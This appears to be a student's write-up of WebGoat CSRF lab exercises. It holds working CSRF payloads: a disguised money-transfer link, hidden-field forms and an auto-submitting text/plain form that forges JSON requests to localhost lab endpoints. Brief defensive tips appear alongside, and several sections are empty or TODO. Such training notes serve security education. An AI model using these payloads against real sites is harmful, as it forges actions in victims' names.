<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**  *generated with [DocToc](https://github.com/thlorenz/doctoc)*

- [A8:2013 Request Forgeries](#a82013-request-forgeries)
  - [Cross-Site Request Forgeries](#cross-site-request-forgeries)
  - [Server-Side Request Forgery](#server-side-request-forgery)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# A8:2013 Request Forgeries

## Cross-Site Request Forgeries

### 1. What is a Cross-site request forgery?

### 2. CSRF witha GET request

`<a href="http://bank.com/transfer?account_number_from=123456789&account_number_to=987654321&amount=100000">View my Pictures!</a>`

### 3. Basic GET CSRF Exercise

```xml
<form 
	method="POST" 
	target="_blank" 
	action="http://localhost:8080/WebGoat/csrf/basic-get-flag">

    <input name="csrf" type="hidden" value="false">
    <input type="submit" name="submit">

</form>
```

### 4. Post a review on someone else’s behalf

```xml
<form 
	method="POST" 
	action="http://localhost:8080/WebGoat/csrf/review">

	<input 
		name="reviewText" 
		placeholder="Add a Review" 
		type="text">
	<input 
		name="stars" 
		type="text">
	<input 
		type="hidden" 
		name="validateReq" 
		value="2aa14227b9a13d0bede0388a7fba9aa9">
	<input 
		type="submit" 
		name="submit" 
		value="Submit review">
</form>
```

### 5. Automatic support from frameworks

Define a separate cookie for CSRF protection, do not reuse the session cookie.
Remember the session cookie should always be defined with http-only flag.

### 6. But I only have JSON APIs and no CORS enabled, how can those be susceptible to CSRF?

Do not rely on `application/json` content type but implement a proper CSRF protection.

### 7. CSRF and content-type

```
POST /csrf/feedback/message HTTP/1.1

{
  "name"    : "WebGoat",
  "email"   : "webgoat@webgoat.org",
  "content" : "WebGoat is the best!!"
}
```

```xml
<form
	name="postform"
	method="post"
	action="http://localhost:8080/WebGoat/csrf/feedback/message/"
	enctype="text/plain">
	
	<input 
		type="hidden" 
		name='
		{
			"name":"WebGoat",
			"email":"webgoat@webgoat.org",
			"content":"WebGoat is the best!!",
			"subject":"service'
		value='"}'>
</form>

<script type="text/javascript">
	document.postform.submit();
</script>
```

### 8. Login CSRF attack

TODO

### 9. 

## Server-Side Request Forgery